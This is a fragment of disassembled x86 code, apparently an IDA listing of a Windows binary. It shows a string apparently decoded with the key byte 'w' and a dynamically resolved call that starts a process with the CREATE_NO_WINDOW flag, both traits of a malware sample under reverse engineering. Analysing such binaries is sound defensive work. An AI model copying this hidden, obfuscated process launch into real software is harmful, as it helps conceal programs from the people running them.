                sub     esp, 28h
                mov     eax, [ebp+var_CAC]
                mov     [esp+0A0h+var_A0], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4
                mov     eax, [ebp+var_CB0]
                mov     [esp+0A0h+var_A0], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4
                mov     eax, dword_40B254
                lea     edx, [ebp+var_11C4]
                mov     [esp+0A0h+var_94], edx
                mov     [esp+0A0h+var_98], 77h ; 'w'
                mov     [esp+0A0h+var_9C], eax
                mov     [esp+0A0h+var_A0], offset unk_40B220
                call    sub_4014F0
                lea     eax, [ebp+var_B60]
                mov     [esp+0A0h+var_94], eax
                lea     eax, [ebp+var_11C4]
                mov     [esp+0A0h+var_98], eax
                mov     [esp+0A0h+var_9C], 410h
                lea     eax, [ebp+var_10C0]
                mov     [esp+0A0h+var_A0], eax
                call    sub_404CC0
                mov     [esp+0A0h+var_98], 44h ; 'D' ; Size
                mov     [esp+0A0h+var_9C], 0 ; Val
                lea     eax, [ebp+var_13C8]
                mov     [esp+0A0h+var_A0], eax ; void *
                call    memset
                mov     [ebp+var_13C8], 44h ; 'D'
                mov     [esp+0A0h+var_98], 10h ; Size
                mov     [esp+0A0h+var_9C], 0 ; Val
                lea     eax, [ebp+var_CB0]
                mov     [esp+0A0h+var_A0], eax ; void *
                call    memset
                lea     eax, [ebp+var_CB0]
                mov     [esp+0A0h+var_7C], eax
                lea     eax, [ebp+var_13C8]
                mov     [esp+0A0h+var_80], eax
                lea     eax, [ebp+PathName]
                mov     [esp+0A0h+var_84], eax
                mov     [esp+0A0h+var_88], 0
                mov     [esp+0A0h+var_8C], 8000000h
                mov     [esp+0A0h+var_90], 0
                mov     [esp+0A0h+var_94], 0
                mov     [esp+0A0h+var_98], 0
                lea     eax, [ebp+var_10C0]
                mov     [esp+0A0h+var_9C], eax
                mov     [esp+0A0h+var_A0], 0
                mov     eax, [ebp+var_2C]
                call    eax
                sub     esp, 28h
                mov     eax, [ebp+var_CAC]
                mov     [esp+0C8h+var_C8], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4
                mov     eax, [ebp+var_CB0]
                mov     [esp+0C8h+var_C8], eax ; hObject
                mov     eax, ds:CloseHandle ; KERNEL32
                call    eax ; CloseHandle ; KERNEL32
                sub     esp, 4

loc_403B6D:                             ; CODE XREF: sub_402D4E+BA5↑j
                                        ; sub_402D4E+BE1↑j
                mov     ds:dword_7B2044, 2

locret_403B77:                          ; CODE XREF: sub_402D4E+52↑j
                leave
                retn
sub_402D4E      endp ; sp-analysis failed